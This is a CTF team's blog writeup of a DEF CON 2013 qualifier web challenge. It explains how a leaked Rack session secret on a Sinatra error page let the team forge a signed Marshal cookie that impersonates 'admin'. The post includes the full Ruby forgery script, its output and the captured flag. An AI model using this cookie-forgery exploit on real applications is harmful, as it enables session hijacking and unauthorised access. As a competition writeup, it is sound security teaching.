@@ -1,0 +1,379 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>DEF CON CTF Qualifier 2013 3dub 3 Writeup - blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="First of all, we got a &#8216;secrets&#8217; link and &#8216;log in or create user&#8217; form. When we create and login, the website redirect us to &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-3dub-3-writeup">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">blue-lotus</a></h1>
+  
+    <h2>Security Research Team @ Tsinghua University</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">DEF CON CTF Qualifier 2013 3dub 3 Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-06-18T00:00:00+08:00" pubdate data-updated="true">Jun 18<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>First of all, we got a &#8216;secrets&#8217; link and &#8216;log in or create user&#8217; form. When we create and login, the website redirect us to the &#8216;secrets&#8217; page like this</p>
+
+<pre><code>Secrets
+name    owner   actions
+key admin   show
+nothing asdf    show
+new secret
+</code></pre>
+
+<p>we&#8217;ve got some links to see secrets owned by other users, include the &#8216;admin&#8217;, or easily add a new secret ourselves.</p>
+
+<p>Having a try to open the <a href="http://hypeman.shallweplayaga.me/secrets/0">admin&#8217;s secret</a>, we got a 500 Error Page with some error stack, which powered by the Ruby framework &#8216;Sinatra&#8217;.</p>
+
+<p>From the very first sight of the page, it said &#8216;unauthorized&#8217; as the error message and a piece of source code was provided</p>
+
+<pre><code>end
+
+  redirect '/secrets'
+end
+
+get '/secrets/:id' do
+  s = SECRETS[params[:id].to_i]
+  raise "unauthorized" if session[:user_name] != s.username
+
+  haml :secret, locals: {secret: s}
+end
+
+helpers do
+  def current_user
+    return nil unless session[:user_name]
+</code></pre>
+
+<p>It meant that I&#8217;m not she secret&#8217;s holder. then have a look at the whole page, and you would find some environment variable in the &#8216;Rack ENV&#8217; section, partly like</p>
+
+<p>rack.session</p>
+
+<p><code>{"session_id"=&gt;"353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a", "tracking"=&gt;{"HTTP_USER_AGENT"=&gt;"9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb", "HTTP_ACCEPT_ENCODING"=&gt;"ed2b3ca90a4e723402367a1d17c8b28392842398", "HTTP_ACCEPT_LANGUAGE"=&gt;"ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6"}, "csrf"=&gt;"5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6", "user_name"=&gt;"test"}</code></p>
+
+<p>rack.session.options</p>
+
+<p><code>{:path=&gt;"/", :domain=&gt;nil, :expire_after=&gt;nil, :secure=&gt;false, :httponly=&gt;true, :defer=&gt;false, :renew=&gt;false, :sidbits=&gt;128, :secure_random=&gt;SecureRandom, :secret=&gt;"wroashsoxDiculReejLykUssyifabEdGhovHabno", :coder=&gt;#}</code></p>
+
+<p>rack.session.unpacked_cookie_data</p>
+
+<p><code>{"session_id"=&gt;"353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a", "tracking"=&gt;{"HTTP_USER_AGENT"=&gt;"9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb", "HTTP_ACCEPT_ENCODING"=&gt;"ed2b3ca90a4e723402367a1d17c8b28392842398", "HTTP_ACCEPT_LANGUAGE"=&gt;"ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6"}, "csrf"=&gt;"5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6", "user_name"=&gt;"test"}</code></p>
+
+<p>rack.request.cookie_hash</p>
+
+<p><code>{"rack.session"=&gt;"BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n--d637305e23d6693f3ebe276b292293c7ff0b72e6"}</code></p>
+
+<p>we&#8217;ve got some message:</p>
+
+<p>the cookie <code>rack.session</code> is some way encoded of <code>rack.session.unpacked_cookie_data</code>, which is totally the same as env variable <code>rack.session</code>, and the coder mybe <code>Rack::Session::Cookie::Base64::Marshal</code>, secret (if any) maybe &#8216;wroashsoxDiculReejLykUssyifabEdGhovHabno&#8217;</p>
+
+<p>By seeking the source code of rack, we found this(<a href="https://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb">https://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb</a>)</p>
+
+<pre><code>@secrets = options.values_at(:secret, :_old_secret).compact
+# some code else
+session_data = coder.encode(session)
+if @secrets.first
+  session_data &lt;&lt; "--#{generate_hmac(session_data, @secrets.first)}"
+end 
+# some code else
+def generate_hmac(data, secret)
+  OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
+end
+</code></pre>
+
+<p>Once the server received a request, it would confirm the validation of the cookie, reset the session if digest mismatch</p>
+
+<pre><code>if @secrets.size &gt; 0 &amp;&amp; session_data
+    session_data, digest = session_data.split("--")
+    session_data = nil unless digest_match?(session_data, digest)
+end
+</code></pre>
+
+<p>Meanwhile, we knew the whole process of the session checking. thus, I&#8217;ve wrote a ruby script to figure out this stuff with this way</p>
+
+<ul>
+<li>unpack(decode) the cookie to origin session data</li>
+<li>modify session_data.user_name to &#8216;admin&#8217;</li>
+<li>repack(encode) the session data to cookie string format</li>
+<li>calculate a new digest of the session data then build the cookie</li>
+</ul>
+
+
+<p>codes below for example</p>
+
+<pre><code>#!/usr/bin/ruby
+#Author: xelz@blue-lotus
+
+require 'openssl'
+
+# part of rack/lib/rack/session/cookie.rb
+class Base64
+    def encode(str)
+        [str].pack('m')
+    end
+
+    def decode(str)
+        str.unpack('m').first
+    end
+
+    # Encode session cookies as Marshaled Base64 data
+    class Marshal &lt; Base64
+        def encode(str)
+            super(::Marshal.dump(str))
+        end
+
+        def decode(str)
+            return unless str
+            ::Marshal.load(super(str)) rescue nil
+        end
+    end
+end
+
+def generate_hmac(data, secret)
+   OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
+end
+
+exit() unless ARGV[0]
+
+data = ARGV[0].split('--')[0]
+# puts 'data is:'
+# puts data, "\n"
+
+coder = Base64::Marshal.new
+data = coder.decode(data)
+data['user_name'] = "admin"
+data = coder.encode(data)
+# puts 'modified data is:'
+# puts data, "\n"
+data = data
+
+secret = 'wroashsoxDiculReejLykUssyifabEdGhovHabno'
+# puts 'new digest string is:'
+digest = generate_hmac(data, secret)
+# puts digest, "\n"
+
+puts 'cookie is'
+cookie = data.gsub("\n", "%0A") + '--' + digest
+puts cookie
+</code></pre>
+
+<p>run the script like this:</p>
+
+<pre><code>xelz@blue-lotus:defconctf$echo -en 'BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n' | awk '{print $1"\\"}' | xargs ./hypeman.rb
+cookie is
+BAh7CSINdHJhY2tpbmd7CCIZSFRUUF9BQ0NFUFRfRU5DT0RJTkciLWVkMmIz%0AY2E5MGE0ZTcyMzQwMjM2N2ExZDE3YzhiMjgzOTI4NDIzOTgiFEhUVFBfVVNF%0AUl9BR0VOVCItOWMxZjdmOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlk%0ANDhiYiIZSFRUUF9BQ0NFUFRfTEFOR1VBR0UiLWNhNGFlZTBlODEyMTRhZGRj%0ANWZiMTI4NzdjZjllNWM4YjhiZWI3ZDYiCWNzcmYiRTVmNmQ4NWI3ZTFiMGE0%0AOGM4YTg3ZTQyODAzYWMxNjZjZjdkNjAxMjFhZmQyNGJhOTM3YmY2NWZhNGY4%0AOTg5YzYiD3Nlc3Npb25faWQiRTM1M2M2NjUyNWEwMWZhMGIzODU2Y2I5ZjM0%0AYWFlMmFhOWEzNmFkNGNkZTAyZGFlYTBjY2ZiYWY1NjZkZGJiNWEiDnVzZXJf%0AbmFtZSIKYWRtaW4=%0A--4bd0a545e155460f804aff9df3e80e20fdffa07f
+</code></pre>
+
+<p>then modify the cookie with the new value, using any tool you like such as Firebug(for Firefox), WebInspector(for Webkit Based Browser), Fiddler(under IE7), Burpsuite(Java Based for any platform), I&#8217;d like to use the Javascript Console in Chrome:</p>
+
+<pre><code>document.cookie='rack.session=xxx;'
+</code></pre>
+
+<p>refresh the page, and enjoy <img src='http://www.blue-lotus.net/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p>
+
+<blockquote><p>key</p>
+
+<p>watch out for this Etdeksogav</p></blockquote>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">xelz</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-06-18T00:00:00+08:00" pubdate data-updated="true">Jun 18<span>th</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>CTF</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-3dub-3-writeup/" data-via="" data-counturl="http://www.blue-lotus.net/www/def-con-ctf-qualifier-2013-3dub-3-writeup/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/defcon-21-quals-annyong-writeup/" title="Previous Post: Defcon 21 Quals annyong writeup">&laquo; Defcon 21 Quals annyong writeup</a>
+      
+      
+        <a class="basic-alignment right" href="/def-con-ctf-qualifier-2013-omgacm-4-writeup/" title="Next Post: DEF CON CTF Qualifier 2013 OMGACM 4 Writeup">DEF CON CTF Qualifier 2013 OMGACM 4 Writeup &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
+      </li>
+    
+      <li class="post">
+        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
